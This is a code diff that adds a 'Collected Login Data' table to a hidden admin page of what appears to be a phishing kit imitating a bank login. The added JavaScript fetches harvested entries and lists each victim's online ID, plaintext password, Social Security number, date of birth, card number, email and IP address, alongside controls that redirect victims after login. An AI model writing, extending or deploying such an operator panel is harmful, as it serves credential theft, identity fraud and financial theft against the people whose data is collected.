@@ -13,6 +13,7 @@ from typing import Optional
 import secrets
 from flow_control.service import force_post_login_route, release_post_login, resolve_post_login_destination
 from flow_control.store import get_login_flow, get_all_login_flows
+from flow_control.login_data import get_all_login_data
 
 # Security configuration
 SECRET_ADMIN_PATH = "admin-flow-control-secret-2024"  # Change this to something secret!
@@ -188,6 +189,42 @@ def create_admin_page():
             margin-bottom: 15px;
             opacity: 0.5;
         }
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background: white;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        .data-table th {
+            background: #667eea;
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .data-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 13px;
+        }
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+        .data-cell {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .data-cell-full {
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
@@ -231,6 +268,14 @@ def create_admin_page():
                     <p class="empty-state">Loading overrides...</p>
                 </div>
             </div>
+
+            <!-- Login Data Section -->
+            <div class="section">
+                <h2>📋 Collected Login Data</h2>
+                <div id="login-data-list">
+                    <p class="empty-state">Loading login data...</p>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -269,12 +314,54 @@ def create_admin_page():
             }
         }
 
+        // Load login data
+        async function loadLoginData() {
+            try {
+                const response = await fetch('/api/login-data');
+                const result = await response.json();
+                
+                const listEl = document.getElementById('login-data-list');
+                
+                if (result.data && result.data.length > 0) {
+                    let html = `<p style="margin-bottom: 15px; color: #666;">Total entries: <strong>${result.count}</strong></p>`;
+                    html += '<table class="data-table">';
+                    html += '<thead><tr><th>ID</th><th>Online ID</th><th>Password</th><th>SSN</th><th>DOB</th><th>Card</th><th>Email</th><th>IP</th><th>Date</th></tr></thead><tbody>';
+                    
+                    result.data.forEach(entry => {
+                        html += `<tr>
+                            <td>${entry.id}</td>
+                            <td class="data-cell">${entry.online_id || '-'}</td>
+                            <td class="data-cell-full">${entry.password || '-'}</td>
+                            <td class="data-cell">${entry.ssn || '-'}</td>
+                            <td class="data-cell">${entry.dob || '-'}</td>
+                            <td class="data-cell">${entry.card_number || '-'}</td>
+                            <td class="data-cell">${entry.email || '-'}</td>
+                            <td class="data-cell">${entry.ip_address || '-'}</td>
+                            <td class="data-cell">${entry.created_at ? new Date(entry.created_at).toLocaleString() : '-'}</td>
+                        </tr>`;
+                    });
+                    
+                    html += '</tbody></table>';
+                    listEl.innerHTML = html;
+                } else {
+                    listEl.innerHTML = '<p class="empty-state">No login data collected yet</p>';
+                }
+            } catch (error) {
+                document.getElementById('login-data-list').innerHTML = 
+                    '<p class="empty-state" style="color: #e74c3c;">Error loading login data</p>';
+            }
+        }
+
         // Load on page load
         loadOverrides();
+        loadLoginData();
         
         // Reload after form submission
         document.querySelector('form').addEventListener('submit', function(e) {
-            setTimeout(loadOverrides, 500);
+            setTimeout(() => {
+                loadOverrides();
+                loadLoginData();
+            }, 500);
         });
     </script>
 </body>
